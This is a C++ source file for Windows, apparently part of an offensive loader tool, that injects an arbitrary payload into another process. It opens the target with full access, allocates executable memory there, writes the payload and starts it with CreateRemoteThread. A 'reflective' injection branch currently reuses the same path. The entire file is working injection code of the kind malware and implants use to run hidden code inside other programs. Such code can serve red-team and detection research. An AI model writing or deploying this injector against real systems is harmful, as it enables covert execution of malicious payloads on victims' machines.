#include "ProcessInject.h"

bool CreateRemoteThreadInject(HANDLE hProc, const uint8_t* payload, size_t payloadSize)
{
	if (!hProc)
	{
		printf("[-] OpenProcess Failed.\n");
		DWORD dwError = GetLastError();
		printf("[-] OpenProcess failed. Error code: %d\n", dwError);
		return FALSE;
	}

	LPVOID pRemoteBuf = VirtualAllocEx(hProc, NULL, payloadSize + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pRemoteBuf == NULL) {
		printf("[-] 内存分配失败, 错误代码: %d\n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProc, pRemoteBuf, payload, payloadSize, NULL)) {
		return FALSE;
	}

	printf("[db]: Remote address is %p\n", pRemoteBuf);

	HANDLE hThread = CreateRemoteThread(
		hProc,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)pRemoteBuf,
		NULL,
		0,
		NULL
	);

	if (!hThread) {
		printf("\n[-] CreateRemoteThread failed: %d", GetLastError());
		return FALSE;
	}

	printf("\n[+] ReflectLoader executed successfully.");

	// 等待线程执行完成
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	return true;
}

bool ReflectInject(HANDLE hProc, const uint8_t* payload, size_t payloadSize)
{
	// 目前反射分支先复用现有执行路径，后续可以在这里替换为独立的反射注入实现。
	return CreateRemoteThreadInject(hProc, payload, payloadSize);
}

bool ProcessInject::Run(DWORD pid, const uint8_t* payload, size_t payloadSize, bool isReflact, std::wstring& message)
{
	if (pid == 0)
	{
		message = L"PID is zero.";
		return false;
	}

	if (payload == nullptr || payloadSize == 0)
	{
		message = L"Payload pointer is null or size is zero.";
		return false;
	}

	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (processHandle == nullptr)
	{
		std::wstringstream ss;
		ss << L"OpenProcess failed."
			<< L"\nPID = " << pid
			<< L"\nError = " << GetLastError();
		message = ss.str();
		return false;
	}

	std::wstringstream ss;
	ss << L"ProcessInject::Run called"
		<< L"\nPID = " << pid
		<< L"\nProcess Handle = " << reinterpret_cast<UINT_PTR>(processHandle)
		<< L"\nPayload Ptr = " << reinterpret_cast<UINT_PTR>(payload)
		<< L"\nPayload Size = 0x" << std::hex << payloadSize
		<< L"\nReflect = " << (isReflact ? L"true" : L"false");

	const bool injectOk = isReflact
		? ReflectInject(processHandle, payload, payloadSize)
		: CreateRemoteThreadInject(processHandle, payload, payloadSize);
	if (!injectOk)
	{
		ss << L"\nInject = FAIL"
			<< L"\nLastError = " << std::dec << GetLastError();
		message = ss.str();
		CloseHandle(processHandle);
		return false;
	}

	ss << L"\nInject = OK";
	message = ss.str();
	CloseHandle(processHandle);
	return true;
}
